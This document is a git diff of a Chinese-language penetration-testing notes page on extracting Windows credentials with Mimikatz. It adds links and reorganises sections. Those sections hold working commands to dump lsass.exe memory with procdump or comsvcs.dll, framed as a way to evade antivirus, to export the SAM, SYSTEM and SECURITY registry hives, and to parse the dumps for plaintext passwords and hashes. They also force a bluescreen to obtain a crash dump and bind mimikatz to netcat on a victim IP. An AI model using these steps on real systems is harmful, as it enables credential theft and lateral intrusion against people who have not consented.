@@ -34,6 +34,7 @@
 - [缓解Mimikatz风格攻击](https://xz.aliyun.com/t/4180)
 - [你真的了解LSA Protection (RunAsPPL)吗？](https://mp.weixin.qq.com/s/7DmfWMHjLXTfCHdoOWQ5qA)
 - [从svchost.exe转储RDP在线用户的明文密码](https://mp.weixin.qq.com/s/8UU-w6J7JaNLn7lE1mTHZA)
+- [读取lsass.dmp报错](http://hone.cool/2018/05/23/%E8%AF%BB%E5%8F%96lsass-dmp%E6%96%87%E4%BB%B6%E6%8A%A5%E9%94%99/)
 
 **辅助项目**
 - [skelsec/pypykatz](https://github.com/skelsec/pypykatz) - 纯 Python 的 Mimikatz 实现,Runs on all OS's which support python>=3.6
@@ -128,43 +129,8 @@ lsadump::cache
 - [LSASS Memory Dumps are Stealthier than Ever Before](https://www.deepinstinct.com/2021/01/24/lsass-memory-dumps-are-stealthier-than-ever-before/)
 - [Lsass Memory Dumps are Stealthier than Ever Before – Part 2](https://www.deepinstinct.com/2021/02/16/lsass-memory-dumps-are-stealthier-than-ever-before-part-2/)
 - [渗透技巧——使用Mimilib从dump文件中导出口令](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BD%BF%E7%94%A8Mimilib%E4%BB%8Edump%E6%96%87%E4%BB%B6%E4%B8%AD%E5%AF%BC%E5%87%BA%E5%8F%A3%E4%BB%A4/)
-
-**直接转储**
-
-在任务管理器找到 lsass.exe，右键创建转储文件
-
-procdump 是微软的官方工具，不会被杀，所以如果你的 mimikatz 不免杀，可以用 procdump 导出 lsass.dmp 后拖回本地抓取密码来规避杀软。
-```bash
-Procdump.exe -accepteula -ma lsass.exe lsass.dmp
-```
-
-也可以采用 pid 方式规避杀软
-```
-tasklist /fi "imagename eq lsass.exe"
-procdump -accepteula -ma 640 lsass.dmp
-
-```
-
-然后用 mimikatz 加载导出来的内存再抓 hash
-```bash
-sekurlsa::minidump c:\users\test\appdata\local\temp\lsass.dmp
-sekurlsa::logonpasswords full
-```
-
-**comsvcs.dll**
-
-使用 `C:\windows\system32\comsvcs.dll` 的导出函数 MiniDump 能够 dump 指定进程的内存文件
-
-在 dump 指定进程内存文件时，需要开启 SeDebugPrivilege 权限, 管理员权限的 cmd 下，默认支持 SeDebugPrivilege 权限，但是状态为 Disabled
-
-直接在 cmd 下执行 rundll32 的命令尝试 dump 指定进程内存文件时，由于无法开启 SeDebugPrivilege 权限，所以会失败, 管理员权限的 powershell 下，默认支持 SeDebugPrivilege 权限，并且状态为 Enabled
-
-所以可以通过 powershell 执行 rundll32 的命令实现
-
-```powershell
-Get-Process lsass
-powershell -c "rundll32 C:\windows\system32\comsvcs.dll, MiniDump 516 C:\lsass.dmp full"
-```
+- [Mimikatz Against Virtual Machine Memory Part 1 Carnal0wnage](https://blog.carnal0wnage.com/2014/05/mimikatz-against-virtual-machine-memory.html)
+- [Mimikatz Against Virtual Machine Memory Part 2 Carnal0wnage](https://blog.carnal0wnage.com/2014/06/mimikatz-against-virtual-machine-memory.html)
 
 **[SharpDump](https://github.com/GhostPack/SharpDump)** c# 免杀抓明文
 
@@ -187,58 +153,6 @@ sekurlsa::logonPasswords full
 
     Sqldumper.exe ProcessID 0 0x01100  # 导出mdmp文件
     ```
-
-**sam + mimikatz**
-
-> 注意：本地复原机器必须与目标机器一致，且需要在系统权限下执行
-
-从 sam 中提取目标系统用户 hash
-```bash
-reg save HKLM\SYSTEM system.hiv
-reg save HKLM\SAM sam.hiv
-reg save HKLM\SECURITY security.hiv
-```
-
-将上述三个文件复制到攻击机本地，然后使用 mimikatz 获取用户 hash
-```bash
-lsadump::sam /system:system.hiv /sam:sam.hiv /security:security.hiv
-```
-
-**windbg 中载入 mimilib 模块**
-
-可通过 notmyfault 强制蓝屏
-- https://docs.microsoft.com/en-us/sysinternals/downloads/notmyfault
-    ```
-    notmyfault64.exe -accepteula /crash
-    ````
-
-    ![](../../../assets/img/Security/安全工具/mimikatz/16.png)
-
-在 windbg 中载入 dmp 文件
-
-![](../../../assets/img/Security/安全工具/mimikatz/5.png)
-
-![](../../../assets/img/Security/安全工具/mimikatz/6.png)
-
-运行. symfix，然后执行. reload
-
-![](../../../assets/img/Security/安全工具/mimikatz/7.png)
-
-windbg 中载入 mimilib 模块
-
-![](../../../assets/img/Security/安全工具/mimikatz/8.png)
-
-查找 lsass 进程
-
-![](../../../assets/img/Security/安全工具/mimikatz/9.png)
-
-将镜像 lsass 环境转换到本机中
-
-![](../../../assets/img/Security/安全工具/mimikatz/10.png)
-
-载入 mimikatz
-
-![](../../../assets/img/Security/安全工具/mimikatz/11.png)
 
 **WerFault.exe**
 
@@ -266,9 +180,109 @@ nc.exe -vv 192.168.1.2 443 -e mimikatz.exe
 # 192.168.1.2 为 Victim IP
 ```
 
+## 直接转储
+
+在任务管理器找到 lsass.exe，右键创建转储文件
+
+procdump 是微软的官方工具，不会被杀，所以如果你的 mimikatz 不免杀，可以用 procdump 导出 lsass.dmp 后拖回本地抓取密码来规避杀软。
+```bash
+Procdump.exe -accepteula -ma lsass.exe lsass.dmp
+```
+
+也可以采用 pid 方式规避杀软
+```
+tasklist /fi "imagename eq lsass.exe"
+procdump -accepteula -ma 640 lsass.dmp
+
+```
+
+然后用 mimikatz 加载导出来的内存再抓 hash
+```bash
+sekurlsa::minidump c:\users\test\appdata\local\temp\lsass.dmp
+sekurlsa::logonpasswords full
+```
+
+## comsvcs.dll
+
+使用 `C:\windows\system32\comsvcs.dll` 的导出函数 MiniDump 能够 dump 指定进程的内存文件
+
+在 dump 指定进程内存文件时，需要开启 SeDebugPrivilege 权限, 管理员权限的 cmd 下，默认支持 SeDebugPrivilege 权限，但是状态为 Disabled
+
+直接在 cmd 下执行 rundll32 的命令尝试 dump 指定进程内存文件时，由于无法开启 SeDebugPrivilege 权限，所以会失败, 管理员权限的 powershell 下，默认支持 SeDebugPrivilege 权限，并且状态为 Enabled
+
+所以可以通过 powershell 执行 rundll32 的命令实现
+
+```powershell
+Get-Process lsass
+powershell -c "rundll32 C:\windows\system32\comsvcs.dll, MiniDump 516 C:\lsass.dmp full"
+```
+
+## sam + mimikatz
+
+> 注意：本地复原机器必须与目标机器一致，且需要在系统权限下执行
+
+从 sam 中提取目标系统用户 hash
+```bash
+reg save HKLM\SYSTEM system.hiv
+reg save HKLM\SAM sam.hiv
+reg save HKLM\SECURITY security.hiv
+```
+
+将上述三个文件复制到攻击机本地，然后使用 mimikatz 获取用户 hash
+```bash
+lsadump::sam /system:system.hiv /sam:sam.hiv /security:security.hiv
+```
+
+## windbg 中载入 mimilib 模块
+
+可通过 notmyfault 强制蓝屏
+- https://docs.microsoft.com/en-us/sysinternals/downloads/notmyfault
+    ```
+    notmyfault64.exe -accepteula /crash
+    ````
+
+    ![](../../../assets/img/Security/安全工具/mimikatz/16.png)
+
+也可以使用 Bin2Dmp 将 vmem 文件转为 dmp 文件
+```
+Bin2Dmp.exe "Windows Server 2008 x64.vmem" win2k8.dmp
+```
+
+在 windbg 中载入 dmp 文件
+
+![](../../../assets/img/Security/安全工具/mimikatz/5.png)
+
+![](../../../assets/img/Security/安全工具/mimikatz/6.png)
+
+运行 `.symfix` ，然后执行 `.reload`
+
+![](../../../assets/img/Security/安全工具/mimikatz/7.png)
+
+运行 `.load D:\xxx\mimilib.dll` windbg 中载入 mimilib 模块
+
+![](../../../assets/img/Security/安全工具/mimikatz/8.png)
+
+`!process 0 0 lsass.exe` 查找 lsass 进程
+
+![](../../../assets/img/Security/安全工具/mimikatz/9.png)
+
+`.process /r /p` 将镜像 lsass 环境转换到本机中
+
+![](../../../assets/img/Security/安全工具/mimikatz/10.png)
+
+`!mimikatz` 载入 mimikatz
+
+![](../../../assets/img/Security/安全工具/mimikatz/11.png)
+
 ---
 
 # 无法抓取 windows 明文密码的解决方法
+
+## 换个操作系统
+
+破解 lsass.dmp 文件是需要系统内核版本
+
+比如在 win03 系统上获取到 lsass.dmp 文件要在 win03 下运行 mimikatz 破解
 
 ## 改注册表
 
